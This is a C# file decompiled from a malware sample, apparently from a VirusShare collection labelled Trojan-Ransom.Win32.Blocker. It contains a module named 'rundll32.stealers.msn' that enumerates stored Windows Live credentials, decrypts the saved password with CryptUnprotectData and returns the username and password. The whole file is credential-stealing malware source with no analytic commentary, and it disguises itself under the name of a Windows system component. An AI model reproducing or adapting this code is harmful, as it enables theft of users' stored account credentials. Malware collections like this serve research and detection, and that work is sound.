// Decompiled with JetBrains decompiler
// Type: rundll32.stealers.msn
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Runtime.InteropServices;

namespace rundll32.stealers
{
  internal class msn
  {
    private static msn.CREDENTIAL Cred;

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CredEnumerateW(
      string filter,
      uint flag,
      out uint count,
      out IntPtr pCredentials);

    [DllImport("crypt32", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptUnprotectData(
      ref msn.DATA_BLOB dataIn,
      int ppszDataDescr,
      int optionalEntropy,
      int pvReserved,
      int pPromptStruct,
      int dwFlags,
      out msn.DATA_BLOB pDataOut);

    public static msn.acount steal()
    {
      msn.acount acount = new msn.acount();
      IntPtr pCredentials = IntPtr.Zero;
      if (msn.CredEnumerateW("WindowsLive:name=*", 0U, out uint _, out pCredentials))
      {
        msn.Cred = (msn.CREDENTIAL) Marshal.PtrToStructure(Marshal.ReadIntPtr(pCredentials, 0), msn.Cred.GetType());
        msn.DATA_BLOB dataIn;
        dataIn.pbData = msn.Cred.CredentialBlob;
        dataIn.cbData = msn.Cred.CredentialBlobSize;
        msn.DATA_BLOB pDataOut;
        msn.CryptUnprotectData(ref dataIn, 0, 0, 0, 0, 1, out pDataOut);
        pDataOut.pbData = dataIn.pbData;
        acount.user = msn.Cred.UserName;
        acount.pass = Marshal.PtrToStringUni(new IntPtr(pDataOut.pbData));
      }
      return acount;
    }

    private struct CREDENTIAL
    {
      public int Flags;
      public int Type;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string TargetName;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string Comment;
      public long LastWritten;
      public int CredentialBlobSize;
      public int CredentialBlob;
      public int Persist;
      public int AttributeCount;
      public IntPtr Attributes;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string TargetAlias;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string UserName;
    }

    private struct DATA_BLOB
    {
      public int cbData;
      public int pbData;
    }

    public struct acount
    {
      public string user;
      public string pass;
    }
  }
}
